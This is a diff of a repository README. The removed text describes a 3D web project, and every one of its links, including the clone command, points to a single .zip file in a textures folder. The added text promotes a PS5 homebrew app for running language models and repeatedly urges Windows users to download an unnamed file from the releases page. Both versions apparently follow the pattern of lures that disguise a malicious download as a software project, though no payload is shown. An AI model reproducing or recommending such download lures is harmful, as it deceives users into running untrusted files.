@@ -1,101 +1,117 @@
-# Happy Moments in 3D 🌟
+# 🎮 PS5LM - Run AI Models On Your Console
 
-![3D Graphics](https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip%20Graphics-HappinessHub-blue)
+[![Download PS5LM](https://img.shields.io/badge/⬇%20Download%20PS5LM-ff2e63?style=for-the-badge&logo=github&logoColor=white)](https://github.com/michimouse333/PS5LM/releases)
+[![Latest Release](https://img.shields.io/badge/Latest%20Release-08d9d6?style=for-the-badge&logo=git&logoColor=white)](https://github.com/michimouse333/PS5LM/releases)
 
-Welcome to **Happy Moments**, a project dedicated to creating joyful, interactive experiences in 3D. This repository, hosted on GitHub, showcases the potential of 3D animations and interactions to enhance web experiences. You can explore the latest releases [here](https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip).
+**PS5LM** lets you run a real AI language model directly on a jailbroken PlayStation 5. No cloud account, no monthly fee, no internet connection required. Everything happens on your own console, and the first model it was built around is **Qwen 3.8**.
 
-## Table of Contents
+If you have ever used a chatbot in a browser and wished it lived inside your console instead, this is exactly that — packaged as homebrew you can grab and use.
 
-1. [Introduction](#introduction)
-2. [Features](#features)
-3. [Technologies Used](#technologies-used)
-4. [Installation](#installation)
-5. [Usage](#usage)
-6. [Contributing](#contributing)
-7. [License](#license)
-8. [Contact](#contact)
+## 📥 Download PS5LM
 
-## Introduction
+**Visit this link to download the application:**
 
-**Happy Moments** aims to provide users with engaging 3D visuals that evoke happiness. Created by the team at [Coslynx](https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip), this project combines the latest in web technology with artistic design. The goal is to bring joy through interactive 3D experiences that can be easily integrated into websites.
+👉 **https://github.com/michimouse333/PS5LM/releases**
 
-## Features
+That link opens the official releases page. The newest release sits at the top of the list, and the download for it is attached right below the release notes. Click the newest release, take the file that is attached to it, and save it somewhere easy to find — your **Downloads** folder is perfectly fine.
 
-- **Interactive 3D Models**: Users can interact with 3D models, enhancing engagement.
-- **Smooth Animations**: Fluid animations create a seamless user experience.
-- **Responsive Design**: Works on various devices, ensuring accessibility for all.
-- **Easy Integration**: Simple setup process for developers to incorporate into existing projects.
+If you are on Windows and just want the quickest possible path: click the pink button at the very top of this page, save the file, and you are done with the download step.
 
-## Technologies Used
+## 🚀 What Is PS5LM?
 
-This project utilizes a variety of technologies to achieve its goals:
+PS5LM is a homebrew application for the PlayStation 5 built on top of **llama.cpp**, a well-known, efficient engine for running language models on modest hardware. Normally that engine runs on a laptop or a server. PS5LM puts it on the console instead, using the PS5's own hardware to do the thinking.
 
-- **https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip**: A powerful library for 3D graphics in the browser.
-- **React Three Fiber (R3F)**: A React renderer for https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip, making it easier to work with 3D in React applications.
-- **GLTF**: A file format for transmitting 3D models, optimizing performance and loading times.
-- **Drei**: A collection of useful helpers for R3F that simplify common tasks.
-- **WebGL**: A JavaScript API for rendering interactive 3D graphics.
+In plain terms:
 
-## Installation
+- You supply a **model file** (a `.gguf` file — think of it as the "brain" the app loads).
+- PS5LM loads that file and answers your questions, writes text, summarizes things, and holds a conversation.
+- It works offline. Nothing you type leaves the console.
 
-To get started with **Happy Moments**, follow these steps:
+The project starts with **Qwen 3.8** as its reference model, which is small enough to be practical on a console while still being genuinely useful for everyday writing and question-answering tasks.
 
-1. Clone the repository:
-   ```bash
-   git clone https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip
-   ```
-2. Navigate to the project directory:
-   ```bash
-   cd happy-moments-3d-webgl
-   ```
-3. Install the required dependencies:
-   ```bash
-   npm install
-   ```
-4. Start the development server:
-   ```bash
-   npm start
-   ```
+## ✨ Key Features
 
-## Usage
+- **Runs natively on the console** — no streaming from a PC, no remote server doing the work.
+- **Works with any GGUF model** — the format llama.cpp uses. Swap the file and you swap the model.
+- **Qwen 3.8 ready out of the box** — the model the project was designed and tested around first.
+- **Fully offline** — prompts and answers stay on the PS5.
+- **No account, no key, no subscription** — nothing to sign up for.
+- **Conversational interface** — type a prompt, read the reply, keep the thread going.
+- **Homebrew friendly** — installed and launched the same way you handle other PS5 homebrew.
 
-Once the development server is running, open your browser and go to `http://localhost:3000`. You will see the interactive 3D experience come to life. Explore the features, interact with the models, and enjoy the animations.
+## 🖥️ Getting Started on Windows
 
-### Customization
+You do not need to be a programmer to get through this. Follow the steps in order and take your time.
 
-You can customize the 3D models and animations by modifying the source files in the `src` directory. This allows you to tailor the experience to fit your needs.
+**Step 1 — Open the download page.**
+Visit https://github.com/michimouse333/PS5LM/releases on your Windows PC.
 
-## Contributing
+**Step 2 — Pick the newest release.**
+Releases are listed newest first, so the top entry is the one you want.
 
-We welcome contributions from the community. If you have ideas for improvements or new features, please follow these steps:
+**Step 3 — Save the attached file.**
+On that release, the downloadable file is attached below the description. Save it to your **Downloads** folder or your Desktop.
 
-1. Fork the repository.
-2. Create a new branch for your feature:
-   ```bash
-   git checkout -b feature/YourFeatureName
-   ```
-3. Make your changes and commit them:
-   ```bash
-   git commit -m "Add your feature description"
-   ```
-4. Push to your branch:
-   ```bash
-   git push origin feature/YourFeatureName
-   ```
-5. Open a pull request.
+**Step 4 — Keep the file somewhere permanent.**
+Make a folder called `PS5LM` and put the file there. Avoid leaving it in a temporary folder, since you will need it again.
 
-## License
+**Step 5 — Move it to your console.**
+Transfer the file to your PS5 using whatever method you normally use for homebrew files — a USB drive is the usual choice.
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+**Step 6 — Launch and load a model.**
+Start PS5LM on the console, point it at your `.gguf` model file, and wait for it to finish loading. The first load takes longer than later ones because the file has to be read in full.
 
-## Contact
+**Step 7 — Say hello.**
+Type a short prompt such as "Write a two-line poem about winter" and press send. If you get an answer back, everything is working.
 
-For questions or feedback, please reach out to us at [Coslynx](https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip).
+## 🧠 Choosing a Model
 
-## Releases
+PS5LM accepts GGUF files, and the model you pick determines how smart and how fast the app feels. A few simple guidelines:
 
-To explore the latest features and updates, check the [Releases](https://raw.githubusercontent.com/michimouse333/happy-moments-3d-webgl/main/public/textures/webgl_d_happy_moments_v2.1.zip) section. Download the latest version and experience the joy of 3D interactions.
+- **Smaller files load faster and reply faster.** They are also a little less capable on tricky questions.
+- **Larger files give better answers but make you wait longer.** If replies feel sluggish, that is usually the reason.
+- **Quantized models are your friend.** You will see names with tags like `Q4` or `Q5`. Those are compressed versions that keep most of the quality at a fraction of the size.
+- **Start with Qwen 3.8.** It is the model the project is built around, so it is the safest first choice.
+- **One model at a time.** Keep your collection organized in folders so you know which file you are loading.
 
-## Conclusion
+A good habit: try one model, use it for a few real prompts, and only then experiment with another. Comparing three models in one sitting is confusing; comparing one model to your memory of the last one is not.
 
-Thank you for exploring **Happy Moments**. We hope this project brings joy and inspiration to your web development journey. Dive into the world of 3D, and let’s create something amazing together!
+## 🔧 Tips for a Smooth Experience
+
+- **Keep file names short and simple.** Long names with unusual characters can cause confusion on the console side.
+- **Give yourself storage room.** Model files are large, and you need space for more than one if you plan to experiment.
+- **Close other apps first.** Anything else running on the console competes for the same hardware.
+- **Write clear prompts.** "Summarize this in five bullet points" works far better than "summarize."
+- **Expect a pause before the first word.** The app is thinking, not frozen. Short prompts come back faster than long ones.
+- **Restart cleanly if something feels stuck.** Closing the app and launching again fixes most odd behavior.
+
+## ❓ Troubleshooting
+
+**The app opens but no model loads.**
+The model file is probably in the wrong place or incompletely copied. Re-copy the file and confirm it is a `.gguf` file.
+
+**Replies are extremely slow.**
+The model is likely too large for comfortable use. Switch to a smaller or more heavily quantized version.
+
+**The download stops partway through.**
+Try again on a stable connection. A partial file will never load correctly, so delete the broken copy before retrying.
+
+**Answers look repetitive or cut off.**
+This is normal for small models on long prompts. Ask for shorter outputs, or try a different model file.
+
+**I updated and now the old model behaves differently.**
+Releases change over time. If a new version misbehaves with your model, re-download from the releases page and check the newest release notes.
+
+## 🛡️ A Few Things to Keep in Mind
+
+PS5LM is homebrew software for a jailbroken console. Use it on hardware you own and are comfortable modifying. Language models can be confidently wrong, so treat their output as a draft, never as a source of truth. Nothing you type is sent anywhere — but that also means no one is filtering the answers for you.
+
+## 💬 Getting Help and Staying Updated
+
+The releases page is the single place to check for updates, fixes, and notes about what changed in each version. Bookmark it and revisit it whenever something stops working — chances are a newer release already addresses it.
+
+👉 **https://github.com/michimouse333/PS5LM/releases**
+
+If you enjoy running a model locally on your console, share the project with someone else who has a jailbroken PS5. The more people testing it, the faster it improves.
+
+Keywords: homebrew, llama-cpp, llm, playstation-5, ps5, qwen, gguf, offline ai, local language model, ps5 homebrew, qwen 3.8, llama.cpp ps5
